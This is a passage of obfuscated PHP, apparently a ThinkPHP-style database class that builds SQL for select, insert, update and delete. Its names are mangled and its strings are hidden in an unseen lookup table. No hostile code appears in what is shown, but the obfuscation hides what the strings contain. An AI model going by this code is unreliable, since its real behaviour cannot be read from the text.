ûôº·[12], $Õ ûôº·[1049] => isset($³ïöŒÚø[$Õ ûôº·[206]]) ? $³ïöŒÚø[$Õ ûôº·[206]] : $Õ ûôº·[12], $Õ ûôº·[1050] => isset($³ïöŒÚø[$Õ ûôº·[207]]) ? $³ïöŒÚø[$Õ ûôº·[207]] : $Õ ûôº·[12], $Õ ûôº·[21] => isset($³ïöŒÚø[$Õ ûôº·[87]]) ? substr($³ïöŒÚø[$Õ ûôº·[87]], 1) : $Õ ûôº·[12]); } else { preg_match($Õ ûôº·[1155], trim($‰²ª¬Ğ), $Â¥­ŞŸØ); $ç¶±Œ‰† = array($Õ ûôº·[1130] => $Â¥­ŞŸØ[1], $Õ ûôº·[1051] => $Â¥­ŞŸØ[2], $Õ ûôº·[1052] => $Â¥­ŞŸØ[3], $Õ ûôº·[1049] => $Â¥­ŞŸØ[4], $Õ ûôº·[1050] => $Â¥­ŞŸØ[5], $Õ ûôº·[21] => $Â¥­ŞŸØ[6]); } $ç¶±Œ‰†[$Õ ûôº·[1082]] = $Õ ûôº·[12]; return $ç¶±Œ‰†; } protected function debug() { $âŒŞïë“ =& $_SERVER[µÅ˜º…æ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $âŒŞïë“[1156]; if (think_config($âŒŞïë“[1157])) { think_status($âŒŞïë“[1158]); think_trace($this->queryStr . $âŒŞïë“[1159] . think_status($âŒŞïë“[24], $âŒŞïë“[1158], 6) . $âŒŞïë“[1160], $âŒŞïë“[12], $âŒŞïë“[1161]); } } protected function parseLock($ÀØÌ×é¥ = false) { $ Ğ±¢Ç¨ =& $_SERVER[µÅ˜º…æ]; if (!$ÀØÌ×é¥) { return $ Ğ±¢Ç¨[12]; } if ($ Ğ±¢Ç¨[1084] == $this->dbType) { return $ Ğ±¢Ç¨[1162]; } return $ Ğ±¢Ç¨[1163]; } protected function parseSet($àÈ´¬—ñ) { $‰ˆ…Œ­ =& $_SERVER[µÅ˜º…æ]; foreach ($àÈ´¬—ñ as $Ù±”Éá => $««î¯ô•) { if (is_array($««î¯ô•) && $‰ˆ…Œ­[372] == $««î¯ô•[0]) { $Ææù¯¨©[] = $this->parseKey($Ù±”Éá) . $‰ˆ…Œ­[464] . $««î¯ô•[1]; } elseif (is_scalar($««î¯ô•) || is_null($««î¯ô•)) { $Ææù¯¨©[] = $this->parseKey($Ù±”Éá) . $‰ˆ…Œ­[464] . $this->parseValue($««î¯ô•); } } return $‰ˆ…Œ­[1164] . implode($‰ˆ…Œ­[50], $Ææù¯¨©); } protected function bindParam($ûµ»µÉ¼, $ºŠÄ†áá) { $this->bind[$_SERVER[µÅ˜º…æ][4] . $ûµ»µÉ¼] = $ºŠÄ†áá; } protected function parseBind($Ùış™¾®) { $Ùış™¾® = array_merge($this->bind, $Ùış™¾®); $this->bind = array(); return $Ùış™¾®; } function parseKey(&$÷œÕ£À, $‹Á÷ú = true) { if ($‹Á÷ú) { $÷œÕ£À = $this->parseKeyCheck($÷œÕ£À); } return $÷œÕ£À; } function parseKeyCheck($Îßßüê”) { $˜„¿–·¯ =& $_SERVER[µÅ˜º…æ]; $Îßßüê” = trim($Îßßüê”); if (!preg_match($˜„¿–·¯[1165], $Îßßüê”)) { think_exception($˜„¿–·¯[1166] . $Îßßüê”); } return $Îßßüê”; } protected function parseValue($¾Ø¤Ù˜) { $½Ú…óş =& $_SERVER[µÅ˜º…æ]; if (is_string($¾Ø¤Ù˜)) { $¾Ø¤Ù˜ = $½Ú…óş[1123] . $this->escapeString($¾Ø¤Ù˜) . $½Ú…óş[1123]; } elseif (isset($¾Ø¤Ù˜[0]) && is_string($¾Ø¤Ù˜[0]) && strtolower($¾Ø¤Ù˜[0]) == $½Ú…óş[372]) { $¾Ø¤Ù˜ = $this->escapeString($¾Ø¤Ù˜[1]); } elseif (is_array($¾Ø¤Ù˜)) { $¾Ø¤Ù˜ = array_map(array($this, $½Ú…óş[1124]), $¾Ø¤Ù˜); } elseif (is_bool($¾Ø¤Ù˜)) { $¾Ø¤Ù˜ = $¾Ø¤Ù˜ ? $½Ú…óş[91] : $½Ú…óş[228]; } elseif (is_null($¾Ø¤Ù˜)) { $¾Ø¤Ù˜ = $½Ú…óş[103]; } return $¾Ø¤Ù˜; } protected function parseField($¨íóî§) { $éœ‹û¹ =& $_SERVER[µÅ˜º…æ]; if (is_string($¨íóî§) && strpos($¨íóî§, $éœ‹û¹[50])) { $¨íóî§ = explode($éœ‹û¹[50], $¨íóî§); } if (is_array($¨íóî§)) { $£¥èÍî» = array(); foreach ($¨íóî§ as $ªúˆ„× => $÷¢’²º°) { if (!is_numeric($ªúˆ„×)) { $£¥èÍî»[] = $this->parseKey($ªúˆ„×, !1) . $éœ‹û¹[1167] . $this->parseKey($÷¢’²º°); } else { $£¥èÍî»[] = $this->parseKey($÷¢’²º°); } } $‚ÇÙøÑÅ = implode($éœ‹û¹[50], $£¥èÍî»); } elseif (is_string($¨íóî§) && !empty($¨íóî§)) { $‚ÇÙøÑÅ = $¨íóî§; } else { $‚ÇÙøÑÅ = $éœ‹û¹[220]; } return $‚ÇÙøÑÅ; } protected function parseTable($„ÉØùä) { $ë¶äõø =& $_SERVER[µÅ˜º…æ]; if (is_array($„ÉØùä)) { $Ü½øçĞé = array(); foreach ($„ÉØùä as $Á°Ç“© => $œçêà) { if (!is_numeric($Á°Ç“©)) { $Ü½øçĞé[] = $this->parseKey($Á°Ç“©) . $ë¶äõø[53] . $this->parseKey($œçêà); } else { $Ü½øçĞé[] = $this->parseKey($Á°Ç“©); } } $„ÉØùä = $Ü½øçĞé; } elseif (is_string($„ÉØùä)) { if (strstr($„ÉØùä, $ë¶äõø[53])) { return $„ÉØùä; } $„ÉØùä = explode($ë¶äõø[50], $„ÉØùä); array_walk($„ÉØùä, array($this, $ë¶äõø[1069])); } return $ë¶äõø[1063] . trim(implode($ë¶äõø[1168], $„ÉØùä), $ë¶äõø[475]) . $ë¶äõø[1063]; } protected function parseWhere($şŒùÚ¦Õ) { $æ„ÆêÍ =& $_SERVER[µÅ˜º…æ]; $Ê©²ıŒ¾ = $æ„ÆêÍ[12]; if (is_string($şŒùÚ¦Õ)) { $Ê©²ıŒ¾ = $şŒùÚ¦Õ; } else { $éà¹€º² = isset($şŒùÚ¦Õ[$æ„ÆêÍ[1169]]) ? strtoupper($şŒùÚ¦Õ[$æ„ÆêÍ[1169]]) : $æ„ÆêÍ[12]; if (in_array($éà¹€º², array($æ„ÆêÍ[1170], $æ„ÆêÍ[1171], $æ„ÆêÍ[1172]))) { $éà¹€º² = $æ„ÆêÍ[53] . $éà¹€º² . $æ„ÆêÍ[53]; unset($şŒùÚ¦Õ[$æ„ÆêÍ[1169]]); } else { $éà¹€º² = $æ„ÆêÍ[1173]; } foreach ($şŒùÚ¦Õ as $ŒÌÚÛÊ… => $ÚÂà™îâ) { $Ê©²ıŒ¾ .= $æ„ÆêÍ[355]; if (is_numeric($ŒÌÚÛÊ…)) { $ŒÌÚÛÊ… = $æ„ÆêÍ[1174]; } if (0 === strpos($ŒÌÚÛÊ…, $æ„ÆêÍ[11])) { $Ê©²ıŒ¾ .= $this->parseThinkWhere($ŒÌÚÛÊ…, $ÚÂà™îâ); } else { if (!preg_match($æ„ÆêÍ[1175], trim($ŒÌÚÛÊ…))) { think_exception(think_lang($æ„ÆêÍ[1176]) . $æ„ÆêÍ[4] . $ŒÌÚÛÊ…); } $½ÕÖè” = is_array($ÚÂà™îâ) && isset($ÚÂà™îâ[$æ„ÆêÍ[1177]]); $ŒÌÚÛÊ… = trim($ŒÌÚÛÊ…); if (strpos($ŒÌÚÛÊ…, $æ„ÆêÍ[212])) { $íˆÜ¾É = explode($æ„ÆêÍ[212], $ŒÌÚÛÊ…); $Ì‰ó‘ò‘ = array(); foreach ($íˆÜ¾É as $ôøšÃŒ± => $Ú¶Öıı) { $äì–„¢Ñ = $½ÕÖè” ? $ÚÂà™îâ[$ôøšÃŒ±] : $ÚÂà™îâ; $Ì‰ó‘ò‘[] = $æ„ÆêÍ[337] . $this->parseWhereItem($this->parseKey($Ú¶Öıı), $äì–„¢Ñ) . $æ„ÆêÍ[1068]; } $Ê©²ıŒ¾ .= implode($æ„ÆêÍ[1178], $Ì‰ó‘ò‘); } elseif (strpos($ŒÌÚÛÊ…, $æ„ÆêÍ[284])) { $íˆÜ¾É = explode($æ„ÆêÍ[284], $ŒÌÚÛÊ…); $Ì‰ó‘ò‘ = array(); foreach ($íˆÜ¾É as $ôøšÃŒ± => $Ú¶Öıı) { $äì–„¢Ñ = $½ÕÖè” ? $ÚÂà™îâ[$ôøšÃŒ±] : $ÚÂà™îâ; $Ì‰ó‘ò‘[] = $æ„ÆêÍ[337] . $this->parseWhereItem($this->parseKey($Ú¶Öıı), $äì–„¢Ñ) . $æ„ÆêÍ[1068]; } $Ê©²ıŒ¾ .= implode($æ„ÆêÍ[1173], $Ì‰ó‘ò‘); } else { $Ê©²ıŒ¾ .= $this->parseWhereItem($this->parseKey($ŒÌÚÛÊ…), $ÚÂà™îâ); } } $Ê©²ıŒ¾ .= $æ„ÆêÍ[356] . $éà¹€º²; } $Ê©²ıŒ¾ = substr($Ê©²ıŒ¾, 0, -strlen($éà¹€º²)); } return empty($Ê©²ıŒ¾) ? $æ„ÆêÍ[12] : $æ„ÆêÍ[1179] . $Ê©²ıŒ¾; } protected function parseWhereItem($½ššû€ğ, $˜«±äÇÂ) { $üØ ñŞø =& $_SERVER[µÅ˜º…æ]; $ë×Â¬ñı = $üØ ñŞø[12]; if (is_array($˜«±äÇÂ)) { if (is_string($˜«±äÇÂ[0])) { $äÉ·àå  = strtolower($˜«±äÇÂ[0]); if (in_array($˜«±äÇÂ[0], array($üØ ñŞø[464], $üØ ñŞø[1180], $üØ ñŞø[1181], $üØ ñŞø[1182], $üØ ñŞø[1183], $üØ ñŞø[1184]))) { $ë×Â¬ñı .= $½ššû€ğ . $üØ ñŞø[53] . $˜«±äÇÂ[0] . $üØ ñŞø[53] . $this->parseValue($˜«±äÇÂ[1]); } elseif (preg_match($üØ ñŞø[1185], $˜«±äÇÂ[0])) { $ë×Â¬ñı .= $½ššû€ğ . $üØ ñŞø[53] . $this->exp[$äÉ·àå ] . $üØ ñŞø[53] . $this->parseValue($˜«±äÇÂ[1]); } elseif (preg_match($üØ ñŞø[1186], $˜«±äÇÂ[0])) { if (is_array($˜«±äÇÂ[1])) { $ÜŸÛòÅ = isset($˜«±äÇÂ[2]) ? strtoupper($˜«±äÇÂ[2]) : $üØ ñŞø[1171]; if (in_array($ÜŸÛòÅ, array($üØ ñŞø[1170], $üØ ñŞø[1171], $üØ ñŞø[1172]))) { $Šè•ï© = array(); foreach ($˜«±äÇÂ[1] as $—öİÒİ–) { $Šè•ï©[] = $½ššû€ğ . $üØ ñŞø[53] . $this->exp[$äÉ·àå ] . $üØ ñŞø[53] . $this->parseValue($—öİÒİ–); } $ë×Â¬ñı .= $üØ ñŞø[337] . implode($üØ ñŞø[53] . $ÜŸÛòÅ . $üØ ñŞø[53], $Šè•ï©) . $üØ ñŞø[1068]; } } else { $ë×Â¬ñı .= $½ššû€ğ . $üØ ñŞø[53] . $this->exp[$äÉ·àå ] . $üØ ñŞø[53] . $this->parseValue($˜«±äÇÂ[1]); } } elseif ($üØ ñŞø[372] == $äÉ·àå ) { $ë×Â¬ñı .= $üØ ñŞø[1066] . $½ššû€ğ . $üØ ñŞø[53] . $˜«±äÇÂ[1] . $üØ ñŞø[1187]; } elseif (preg_match($üØ ñŞø[1188], $˜«±äÇÂ[0])) { $ë×Â¬ñı .= $˜«±äÇÂ[0]; } elseif (preg_match($üØ ñŞø[1189], $˜«±äÇÂ[0])) { if (isset($˜«±äÇÂ[2]) && $üØ ñŞø[372] == $˜«±äÇÂ[2]) { $ë×Â¬ñı .= $½ššû€ğ . $üØ ñŞø[53] . $this->exp[$äÉ·àå ] . $üØ ñŞø[53] . $˜«±äÇÂ[1]; } else { if (is_string($˜«±äÇÂ[1])) { $˜«±äÇÂ[1] = explode($üØ ñŞø[50], $˜«±äÇÂ[1]); } $òàˆşã = implode($üØ ñŞø[50], $this->parseValue($˜«±äÇÂ[1])); $ë×Â¬ñı .= $½ššû€ğ . $üØ ñŞø[53] . $this->exp[$äÉ·àå ] . $üØ ñŞø[1066] . $òàˆşã . $üØ ñŞø[1068]; } } elseif (preg_match($üØ ñŞø[1190], $˜«±äÇÂ[0])) { $“òùÙğÄ = is_string($˜«±äÇÂ[1]) ? explode($üØ ñŞø[50], $˜«±äÇÂ[1]) : $˜«±äÇÂ[1]; $ë×Â¬ñı .= $üØ ñŞø[1066] . $½ššû€ğ . $üØ ñŞø[53] . $this->exp[$äÉ·àå ] . $üØ ñŞø[53] . $this->parseValue($“òùÙğÄ[0]) . $üØ ñŞø[1173] . $this->parseValue($“òùÙğÄ[1]) . $üØ ñŞø[356]; } else { think_exception(think_lang($üØ ñŞø[1176]) . $üØ ñŞø[4] . $˜«±äÇÂ[0]); } } else { $Öª—¾ùô = count($˜«±äÇÂ); $‘ÀÖºÅº = $üØ ñŞø[12]; if (is_string($˜«±äÇÂ[$Öª—¾ùô - 1])) { $‘ÀÖºÅº = isset($˜«±äÇÂ[$Öª—¾ùô - 1]) ? strtoupper($˜«±äÇÂ[$Öª—¾ùô - 1]) : $üØ ñŞø[12]; if (in_array($‘ÀÖºÅº, array($üØ ñŞø[1170], $üØ ñŞø[1171], $üØ ñŞø[1172]))) { $Öª—¾ùô = $Öª—¾ùô - 1; } } else { $‘ÀÖºÅº = $üØ ñŞø[1170]; } for ($Èı»˜“ë = 0; $Èı»˜“ë < $Öª—¾ùô; $Èı»˜“ë++) { $“òùÙğÄ = is_array($˜«±äÇÂ[$Èı»˜“ë]) ? $˜«±äÇÂ[$Èı»˜“ë][1] : $˜«±äÇÂ[$Èı»˜“ë]; if ($üØ ñŞø[372] == strtolower($˜«±äÇÂ[$Èı»˜“ë][0])) { $ë×Â¬ñı .= $üØ ñŞø[337] . $½ššû€ğ . $üØ ñŞø[53] . $“òùÙğÄ . $üØ ñŞø[1187] . $‘ÀÖºÅº . $üØ ñŞø[53]; } else { $ò¿¨ŠÍÊ = is_array($˜«±äÇÂ[$Èı»˜“ë]) ? $this->exp[strtolower($˜«±äÇÂ[$Èı»˜“ë][0])] : $üØ ñŞø[464]; if (!$ò¿¨ŠÍÊ && is_array($˜«±äÇÂ[$Èı»˜“ë]) && in_array($˜«±äÇÂ[$Èı»˜“ë][0], array($üØ ñŞø[464], $üØ ñŞø[1180], $üØ ñŞø[1181], $üØ ñŞø[1182], $üØ ñŞø[1183], $üØ ñŞø[1184]))) { $ò¿¨ŠÍÊ = $˜«±äÇÂ[$Èı»˜“ë][0]; } $ë×Â¬ñı .= $üØ ñŞø[337] . $½ššû€ğ . $üØ ñŞø[53] . $ò¿¨ŠÍÊ . $üØ ñŞø[53] . $this->parseValue($“òùÙğÄ) . $üØ ñŞø[1187] . $‘ÀÖºÅº . $üØ ñŞø[53]; } } $ë×Â¬ñı = substr($ë×Â¬ñı, 0, -4); } } else { $ë×Â¬ñı .= $½ššû€ğ . $üØ ñŞø[1191] . $this->parseValue($˜«±äÇÂ); } return $ë×Â¬ñı; } protected function parseThinkWhere($İíÏ¡½‚, $…İ›ö“) { $Åš£œÂ =& $_SERVER[µÅ˜º…æ]; $ñÏÜßˆî = $Åš£œÂ[12]; switch ($İíÏ¡½‚) { case $Åš£œÂ[427]: $ñÏÜßˆî = $…İ›ö“; break; case $Åš£œÂ[1174]: $ñÏÜßˆî = is_string($…İ›ö“) ? $…İ›ö“ : substr($this->parseWhere($…İ›ö“), 6); break; case $Åš£œÂ[1192]: parse_str($…İ›ö“, $”ÚÁŒÊÓ); if (isset($”ÚÁŒÊÓ[$Åš£œÂ[1169]])) { $İµ†Ö· = $Åš£œÂ[53] . strtoupper($”ÚÁŒÊÓ[$Åš£œÂ[1169]]) . $Åš£œÂ[53]; unset($”ÚÁŒÊÓ[$Åš£œÂ[1169]]); } else { $İµ†Ö· = $Åš£œÂ[1173]; } $‰Üæç¹Æ = array(); foreach ($”ÚÁŒÊÓ as $ô¶ÊÊ => $ş¨ÍÇÖ) { $‰Üæç¹Æ[] = $this->parseKey($ô¶ÊÊ) . $Åš£œÂ[1191] . $this->parseValue($ş¨ÍÇÖ); } $ñÏÜßˆî = implode($İµ†Ö·, $‰Üæç¹Æ); break; } return $ñÏÜßˆî; } protected function parseLimit($¨¾Â½‹‰) { $¼‘¿Ú½ =& $_SERVER[µÅ˜º…æ]; return !empty($¨¾Â½‹‰) ? $¼‘¿Ú½[51] . $¨¾Â½‹‰ . $¼‘¿Ú½[53] : $¼‘¿Ú½[12]; } protected function parseJoin($”íÔ÷) { $óÌÑÑòö =& $_SERVER[µÅ˜º…æ]; $èÄæÀ”Ú = $óÌÑÑòö[12]; if (!empty($”íÔ÷)) { if (is_array($”íÔ÷)) { foreach ($”íÔ÷ as $©Ñ¹Ê’¼ => $´´˜ç»î) { if (!1 !== stripos($´´˜ç»î, $óÌÑÑòö[1193])) { $èÄæÀ”Ú .= $óÌÑÑòö[53] . $´´˜ç»î; } else { $èÄæÀ”Ú .= $óÌÑÑòö[1194] . $´´˜ç»î; } } } else { $èÄæÀ”Ú .= $óÌÑÑòö[1194] . $”íÔ÷; } } $èÄæÀ”Ú = preg_replace($óÌÑÑòö[1195], think_config($óÌÑÑòö[1096]) . $óÌÑÑòö[1196], $èÄæÀ”Ú); return $èÄæÀ”Ú; } protected function parseOrder($µõüÃÅÊ) { $äæ…­‚É =& $_SERVER[µÅ˜º…æ]; if (is_array($µõüÃÅÊ)) { $ã·ÃÓ‹€ = array(); foreach ($µõüÃÅÊ as $ºìŠ´ñà => $‰äÁƒˆô) { if (is_numeric($ºìŠ´ñà)) { $ã·ÃÓ‹€[] = $this->parseKey($‰äÁƒˆô); } else { $‰äÁƒˆô = in_array(strtoupper(trim($‰äÁƒˆô)), array($äæ…­‚É[1197], $äæ…­‚É[1198])) ? $äæ…­‚É[53] . $‰äÁƒˆô : $äæ…­‚É[12]; if (preg_match($äæ…­‚É[1199], $ºìŠ´ñà)) { $ã·ÃÓ‹€[] = $this->parseKey($ºìŠ´ñà) . $‰äÁƒˆô; } else { think_exception($äæ…­‚É[1200] . $ºìŠ´ñà); } } } $µõüÃÅÊ = implode($äæ…­‚É[50], $ã·ÃÓ‹€); } return !empty($µõüÃÅÊ) ? $äæ…­‚É[1201] . $µõüÃÅÊ : $äæ…­‚É[12]; } protected function parseGroup($õ„ı…ä€) { $Œƒ¢€é =& $_SERVER[µÅ˜º…æ]; return !empty($õ„ı…ä€) ? $Œƒ¢€é[1202] . $õ„ı…ä€ : $Œƒ¢€é[12]; } protected function parseHaving($Ÿ·À¯ò¨) { $ÜÍÔ²€• =& $_SERVER[µÅ˜º…æ]; return !empty($Ÿ·À¯ò¨) ? $ÜÍÔ²€•[1203] . $Ÿ·À¯ò¨ : $ÜÍÔ²€•[12]; } protected function parseComment($Óƒ”¸Â“) { $ô„ø£õ¦ =& $_SERVER[µÅ˜º…æ]; return !empty($Óƒ”¸Â“) ? $ô„ø£õ¦[1204] . $Óƒ”¸Â“ . $ô„ø£õ¦[1205] : $ô„ø£õ¦[12]; } protected function parseDistinct($ì†¼Ÿ) { $Ê€îåÎ =& $_SERVER[µÅ˜º…æ]; return !empty($ì†¼Ÿ) ? $Ê€îåÎ[1206] : $Ê€îåÎ[12]; } protected function parseUnion($¼º”Á¶ï) { $À¢¼õüÊ =& $_SERVER[µÅ˜º…æ]; if (empty($¼º”Á¶ï)) { return $À¢¼õüÊ[12]; } if (isset($¼º”Á¶ï[$À¢¼õüÊ[423]])) { $Ø‰øëšÜ = $À¢¼õüÊ[1207]; unset($¼º”Á¶ï[$À¢¼õüÊ[423]]); } else { $Ø‰øëšÜ = $À¢¼õüÊ[1208]; } foreach ($¼º”Á¶ï as $îğ“è•Ú) { $¡‹øŸŒ[] = $Ø‰øëšÜ . (is_array($îğ“è•Ú) ? $this->buildSelectSql($îğ“è•Ú) : $îğ“è•Ú); } return implode($À¢¼õüÊ[53], $¡‹øŸŒ); } public function insert($ğÚîÀà¶, $åÒœû†Õ = array(), $ïıŒá“Ñ = false) { $’¶ Ü­˜ =& $_SERVER[µÅ˜º…æ]; $‚òè¹Ğ = $®ã—õ­ = array(); $this->model = $åÒœû†Õ[$’¶ Ü­˜[359]]; foreach ($ğÚîÀà¶ as $ªæåÌ¹½ => $…ìÃˆ…«) { if (is_array($…ìÃˆ…«) && $’¶ Ü­˜[372] == $…ìÃˆ…«[0]) { $®ã—õ­[] = $this->parseKey($ªæåÌ¹½); $‚òè¹Ğ[] = $…ìÃˆ…«[1]; } elseif (is_scalar($…ìÃˆ…«) || is_null($…ìÃˆ…«)) { $®ã—õ­[] = $this->parseKey($ªæåÌ¹½); $‚òè¹Ğ[] = $this->parseValue($…ìÃˆ…«); } } $˜®¾ãÛ· = ($ïıŒá“Ñ ? $’¶ Ü­˜[1070] : $’¶ Ü­˜[1071]) . $’¶ Ü­˜[1072] . $this->parseTable($åÒœû†Õ[$’¶ Ü­˜[357]]) . $’¶ Ü­˜[1066] . implode($’¶ Ü­˜[50], $®ã—õ­) . $’¶ Ü­˜[1067] . implode($’¶ Ü­˜[50], $‚òè¹Ğ) . $’¶ Ü­˜[1068]; $˜®¾ãÛ· .= $this->parseLock(isset($åÒœû†Õ[$’¶ Ü­˜[999]]) ? $åÒœû†Õ[$’¶ Ü­˜[999]] : !1); $˜®¾ãÛ· .= $this->parseComment(!empty($åÒœû†Õ[$’¶ Ü­˜[429]]) ? $åÒœû†Õ[$’¶ Ü­˜[429]] : $’¶ Ü­˜[12]); return $this->execute($˜®¾ãÛ·, $this->parseBind(!empty($åÒœû†Õ[$’¶ Ü­˜[361]]) ? $åÒœû†Õ[$’¶ Ü­˜[361]] : array())); } public function selectInsert($º€÷ëÔç, $íä½—åì, $©…«£Í = array()) { $€ØÃÎï =& $_SERVER[µÅ˜º…æ]; $this->model = $©…«£Í[$€ØÃÎï[359]]; if (is_string($º€÷ëÔç)) { $º€÷ëÔç = explode($€ØÃÎï[50], $º€÷ëÔç); } array_walk($º€÷ëÔç, array($this, $€ØÃÎï[1069])); $Òìˆ©¡ = $€ØÃÎï[1209] . $this->parseTable($íä½—åì) . $€ØÃÎï[1066] . implode($€ØÃÎï[50], $º€÷ëÔç) . $€ØÃÎï[1187]; $Òìˆ©¡ .= $this->buildSelectSql($©…«£Í); return $this->execute($Òìˆ©¡, $this->parseBind(!empty($©…«£Í[$€ØÃÎï[361]]) ? $©…«£Í[$€ØÃÎï[361]] : array())); } public function update($ì«Ì³ø„, $Ş¸¦—€Ò) { $­µÖ·‰´ =& $_SERVER[µÅ˜º…æ]; $this->model = $Ş¸¦—€Ò[$­µÖ·‰´[359]]; $Ò“‚Ò = $­µÖ·‰´[1210] . $this->parseTable($Ş¸¦—€Ò[$­µÖ·‰´[357]]) . $this->parseSet($ì«Ì³ø„) . $this->parseWhere(!empty($Ş¸¦—€Ò[$­µÖ·‰´[353]]) ? $Ş¸¦—€Ò[$­µÖ·‰´[353]] : $­µÖ·‰´[12]) . $this->parseOrder(!empty($Ş¸¦—€Ò[$­µÖ·‰´[441]]) ? $Ş¸¦—€Ò[$­µÖ·‰´[441]] : $­µÖ·‰´[12]) . $this->parseLimit(!empty($Ş¸¦—€Ò[$­µÖ·‰´[368]]) ? $Ş¸¦—€Ò[$­µÖ·‰´[368]] : $­µÖ·‰´[12]) . $this->parseLock(isset($Ş¸¦—€Ò[$­µÖ·‰´[999]]) ? $Ş¸¦—€Ò[$­µÖ·‰´[999]] : !1) . $this->parseComment(!empty($Ş¸¦—€Ò[$­µÖ·‰´[429]]) ? $Ş¸¦—€Ò[$­µÖ·‰´[429]] : $­µÖ·‰´[12]); return $this->execute($Ò“‚Ò, $this->parseBind(!empty($Ş¸¦—€Ò[$­µÖ·‰´[361]]) ? $Ş¸¦—€Ò[$­µÖ·‰´[361]] : array())); } public function delete($ØÜ›©”ö = array()) { $°ìÇÈÂú =& $_SERVER[µÅ˜º…æ]; $this->model = $ØÜ›©”ö[$°ìÇÈÂú[359]]; $õ˜ ï› = $°ìÇÈÂú[1211] . $this->parseTable($ØÜ›©”ö[$°ìÇÈÂú[357]]) . $this->parseWhere(!empty($ØÜ›©”ö[$°ìÇÈÂú[353]]) ? $ØÜ›©”ö[$°ìÇÈÂú[353]] : $°ìÇÈÂú[12]) . $this->parseOrder(!empty($ØÜ›©”ö[$°ìÇÈÂú[441]]) ? $ØÜ›©”ö[$°ìÇÈÂú[441]] : $°ìÇÈÂú[12]) . $this->parseLimit(!empty($ØÜ›©”ö[$°ìÇÈÂú[368]]) ? $ØÜ›©”ö[$°ìÇÈÂú[368]] : $°ìÇÈÂú[12]) . $this->parseLock(isset($ØÜ›©”ö[$°ìÇÈÂú[999]]) ? $ØÜ›©”ö[$°ìÇÈÂú[999]] : !1) . $this->parseComment(!empty($ØÜ›©”ö[$°ìÇÈÂú[429]]) ? $ØÜ›©”ö[$°ìÇÈÂú[429]] : $°ìÇÈÂú[12]); return $this->execute($õ˜ ï›, $this->parseBind(!empty($ØÜ›©”ö[$°ìÇÈÂú[361]]) ? $ØÜ›©”ö[$°ìÇÈÂú[361]] : array())); } public function select($©ì¾äƒ´ = array()) { $õ¹¨ñ ‚ =& $_SERVER[µÅ˜º…æ]; $this->model = $©ì¾äƒ´[$õ¹¨ñ ‚[359]]; $¤ÒÍ‹ = $this->buildSelectSql($©ì¾äƒ´); $‘°ÒĞÑŒ = isset($©ì¾äƒ´[$õ¹¨ñ ‚[424]]) ? $©ì¾äƒ´[$õ¹¨ñ ‚[424]] : !1; if ($‘°ÒĞÑŒ) { $›íèĞ ˆ = is_string($‘°ÒĞÑŒ[$õ¹¨ñ ‚[95]]) ? $‘°ÒĞÑŒ[$õ¹¨ñ ‚[95]] : $õ¹¨ñ ‚[1212] . md5($¤ÒÍ‹); $ø‘±’òİ = think_cache($›íèĞ ˆ, $õ¹¨ñ ‚[12], $‘°ÒĞÑŒ); if (!1 !== $ø‘±’òİ) { return $ø‘±’òİ; } } $ıÉÁ¢× = $this->query($¤ÒÍ‹, $this->parseBind(!empty($©ì¾äƒ´[$õ¹¨ñ ‚[361]]) ? $©ì¾äƒ´[$õ¹¨ñ ‚[361]] : array())); if ($‘°ÒĞÑŒ && !1 !== $ıÉÁ¢×) { think_cache($›íèĞ ˆ, $ıÉÁ¢×, $‘°ÒĞÑŒ); } return $ıÉÁ¢×; } public function buildSelectSql($´Ñ¡ûÎ = array()) { $¨×ô¬‰· =& $_SERVER[µÅ˜º…æ]; if (isset($´Ñ¡ûÎ[$¨×ô¬‰·[428]])) { if (strpos($´Ñ¡ûÎ[$¨×ô¬‰·[428]], $¨×ô¬‰·[50])) { list($ÙıÅßñ, $ÇÓŠ–“) = explode($¨×ô¬‰·[50], $´Ñ¡ûÎ[$¨×ô¬‰·[428]]); } else { $ÙıÅßñ = $´Ñ¡ûÎ[$¨×ô¬‰·[428]]; } $ÙıÅßñ = $ÙıÅßñ ? $ÙıÅßñ : 1; $ÇÓŠ–“ = isset($ÇÓŠ–“) ? $ÇÓŠ–“ : (is_numeric($´Ñ¡ûÎ[$¨×ô¬‰·[368]]) ? $´Ñ¡ûÎ[$¨×ô¬‰·[368]] : 20); $ú²ş¶¿› = $ÇÓŠ–“ * ((int) $ÙıÅßñ - 1); $´Ñ¡ûÎ[$¨×ô¬‰·[368]] = $ú²ş¶¿› . $¨×ô¬‰·[50] . $ÇÓŠ–“; } if (think_config($¨×ô¬‰·[1213])) { $·Äû˜ = $¨×ô¬‰·[1214] . md5(serialize($´Ñ¡ûÎ)); $¡õÅóÌ = think_cache($·Äû˜); if ($¡õÅóÌ) { return $¡õÅóÌ; } } $Úİæ®Îâ = $this->parseSql($this->selectSql, $´Ñ¡ûÎ); $Úİæ®Îâ .= $this->parseLock(isset($´Ñ¡ûÎ[$¨×ô¬‰·[999]]) ? $´Ñ¡ûÎ[$¨×ô¬‰·[999]] : !1); if (isset($·Äû˜)) { think_cache($·Äû˜, $Úİæ®Îâ); } return $Úİæ®Îâ; } public function parseSql($ŞÔøÄÌë, $Î›”€óÇ = array()) { $Šô£áÌÇ =& $_SERVER[µÅ˜º…æ]; $ŞÔøÄÌë = str_replace(array($Šô£áÌÇ[1215], $Šô£áÌÇ[1216], $Šô£áÌÇ[1217], $Šô£áÌÇ[1218], $Šô£áÌÇ[1219], $Šô£áÌÇ[1220], $Šô£áÌÇ[1221], $Šô£áÌÇ[1222], $Šô£áÌÇ[1223], $Šô£áÌÇ[1224], $Šô£áÌÇ[1225]), array($this->parseTable("{$Î›”€óÇ[$Šô£áÌÇ[357]]}"), $this->parseDistinct(isset($Î›”€óÇ[$Šô£áÌÇ[1226]]) ? $Î›”€óÇ[$Šô£áÌÇ[1226]] : !1), $this->parseField(!empty($Î›”€óÇ[$Šô£áÌÇ[351]]) ? $Î›”€óÇ[$Šô£áÌÇ[351]] : $Šô£áÌÇ[220]), $this->parseJoin(!empty($Î›”€óÇ[$Šô£áÌÇ[360]]) ? $Î›”€óÇ[$Šô£áÌÇ[360]] : $Šô£áÌÇ[12]), $this->parseWhere(!empty($Î›”€óÇ[$Šô£áÌÇ[353]]) ? $Î›”€óÇ[$Šô£áÌÇ[353]] : $Šô£áÌÇ[12]), $this->parseGroup(!empty($Î›”€óÇ[$Šô£áÌÇ[598]]) ? $Î›”€óÇ[$Šô£áÌÇ[598]] : $Šô£áÌÇ[12]), $this->parseHaving(!empty($Î›”€óÇ[$Šô£áÌÇ[1227]]) ? $Î›”€óÇ[$Šô£áÌÇ[1227]] : $Šô£áÌÇ[12]), 